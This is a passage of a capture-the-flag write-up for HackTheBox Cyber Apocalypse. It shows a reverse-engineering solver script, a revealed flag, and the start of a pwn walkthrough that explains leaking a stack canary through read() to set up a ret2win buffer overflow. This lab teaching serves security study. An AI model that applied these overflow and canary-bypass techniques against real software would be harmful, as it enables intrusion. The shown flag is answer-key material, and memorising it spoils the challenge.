+</span></span><span class="line"><span class="cl">  <span class="n">__nmemb</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pvVar2</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">__nmemb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">builtin_strncpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span><span class="p">,</span><span class="mh">0x41</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_80</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_7c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_78</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">param_1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pcVar3</span> <span class="o">=</span> <span class="nf">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_7c</span> <span class="o">=</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">pcVar3</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">local_7c</span> <span class="o">*</span> <span class="mh">0x40</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">local_78</span> <span class="o">+</span> <span class="mi">6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">7</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">pvVar2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_80</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">local_7c</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">-</span> <span class="mi">8U</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">local_80</span> <span class="o">=</span> <span class="n">local_80</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">local_78</span> <span class="o">+</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_78</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">pvVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">reverse_str</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">msg_length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">sVar2</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">msg_length</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">msg_length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cVar1</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">param_1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[(</span><span class="kt">long</span><span class="p">)(</span><span class="n">msg_length</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">param_1</span><span class="p">[(</span><span class="kt">long</span><span class="p">)(</span><span class="n">msg_length</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">cVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">decode_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">decoded_flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">decoded_flag</span> <span class="o">=</span> <span class="nf">base64_decode</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">reverse_str</span><span class="p">(</span><span class="n">decoded_flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">decoded_flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>The logic behind the program is pretty simple:</p>
+<ul>
+<li>Our input will compare with the secret message. If our input is same with the secret message, then the flag will appears.</li>
+<li>The secret message can be found inside the <code>decode_secret</code> function. String <strong>incantation</strong> is stored in the <code>$RDI</code> register. The secret message is <strong>encoded with base64</strong> and <strong>reversed</strong>.</li>
+</ul>
+<p><strong>3. Decrypt The Secret Message</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_rev2-01.png"
+        data-srcset="/images/htb-cyber-apocalypse_rev2-01.png, /images/htb-cyber-apocalypse_rev2-01.png 1.5x, /images/htb-cyber-apocalypse_rev2-01.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_rev2-01.png"
+        title="SealedRune-01" width="917" height="460" /></p>
+<p>The image above is the encoded secret message in hex format (stored in <code>$RDI</code> register). The combination of each hex characters is <code>65h 6Dh 46h 79h 5Ah 6Dh 5Ah 31h 62h 6Bh 64h 73h 5Ah 57h 46h 57h 00h</code>. If we try to decode all hex characters, the output will be <code>emFyZmZ1bkdsZWFW</code>. Okay, its seems like base64 encoded string, the output of decoded string is <code>zarffunGleaV</code>. We&rsquo;re not done yet, we&rsquo;ve to reverse the decoded string, so the final secret message is <code>VaelGnuffraz</code>.</p>
+<p>If we input the correct secret message, then we got the flag. Here&rsquo;s my solver script.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">encoded_secret_msg</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 1. Decode the hex encoded string.</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_decoded</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">encoded_secret_msg</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 2. Decode the base64 encoded string.</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base64_decoded</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">hex_decoded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 3. Reverse the decoded string.</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reversed_string</span> <span class="o">=</span> <span class="n">base64_decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">reversed_string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded_secret_msg</span> <span class="o">=</span> <span class="s2">&#34;65h 6Dh 46h 79h 5Ah 6Dh 5Ah 31h 62h 6Bh 64h 73h 5Ah 57h 46h 57h 00h&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_secret_msg</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">encoded_secret_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Input the decoded secret message into the program.</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># context.log_level = &#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Start the process</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">decoded_secret_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Print the flag</span>
+</span></span><span class="line"><span class="cl">    <span class="n">search_flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;HTB{.*}&#39;</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">search_flag</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="k">if</span> <span class="n">search_flag</span> <span class="k">else</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag --&gt; </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">flag</span> <span class="k">else</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag not found&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_rev2-02.png"
+        data-srcset="/images/htb-cyber-apocalypse_rev2-02.png, /images/htb-cyber-apocalypse_rev2-02.png 1.5x, /images/htb-cyber-apocalypse_rev2-02.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_rev2-02.png"
+        title="SealedRune-02" width="966" height="194" /></p>
+<h3 id="flag-3">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>HTB{run3_m4g1c_r3v34l3d}</code></div>
+        </div>
+    </div>
+<hr>
+<h1 id="pwn">Pwn</h1>
+<h2 id="quack-quack-upsolved-after-ended">Quack Quack (Upsolved After Ended)</h2>
+<h3 id="description-4">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to open the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">On the quest to reclaim the Dragon&rsquo;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it&rsquo;s time to face the Duck!</div>
+        </div>
+    </div>
+<h3 id="required-knowledge-4">Required Knowledge</h3>
+<ul>
+<li>C programming</li>
+<li>Buffer overflow vulnerability</li>
+<li>Stack canary protection</li>
+<li>Hijack program flow (ret2win)</li>
+</ul>
+<h3 id="solve-walkthrough-4">Solve Walkthrough</h3>
+<ol>
+<li><strong>Basic File Checks</strong></li>
+</ol>
+<p>First, I do basic file check using <code>file</code> command.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./quack_quack: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>225daf82164eadc6e19bee1cd1965754eefed6aa, <span class="k">for</span> GNU/Linux 3.2.0, not stripped</span></span></code></pre></div></div>
+<p>From the output above, that is a <strong>64-bit dynamically linked ELF binary</strong>. Next, see the protections using <code>checksec</code> command.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:      Full RELRO
+</span></span><span class="line"><span class="cl">Stack:      Canary found
+</span></span><span class="line"><span class="cl">NX:         NX enabled
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">RUNPATH:    b<span class="s1">&#39;./glibc/&#39;</span>
+</span></span><span class="line"><span class="cl">SHSTK:      Enabled
+</span></span><span class="line"><span class="cl">IBT:        Enabled
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<p>As you can see, this binary is full of protection, except PIE / PIC (Position Independent Code). That means every we run the binary, the memory address is still same, such as the buffer, local variable, etc.</p>
+<ol>
+<li><strong>Analyze The Binary</strong></li>
+</ol>
+<p>Unlike reverse engineering challenge before, in pwn we&rsquo;ve to know the fundamentals of memory layout, such as stack, heap, etc. In this case, vulnerability of the binary is happen in the stack that can cause buffer overflow. But, inside the binary found a protection called &ldquo;<strong>Stack Canary</strong>&rdquo;. Basically, it just random value located at <code>$RBP-0x8</code> (<strong>64-bit</strong>) / <code>$EBP-0x4</code> (<strong>32-bit</strong>).</p>
+<p>How can we bypass the Stack Canary protection? We&rsquo;ve to know that read function in C is not completely safe. The read function is <strong>leakable</strong>, which means that after input is <strong>not ended with NULL terminated string</strong> (<code>\\x00</code>). If the string or array of characters is not null terminated string, it can be <strong>leaked some information in the stack</strong>, including <em>stack canary</em>. Okay, let&rsquo;s start with decompile the binary.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">duckling</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">duckling</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">chk_substring</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_68</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_60</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_58</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0xb</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0xc</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0xd</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0xe</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0xf</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x11</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x12</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x13</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x14</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x15</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x16</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
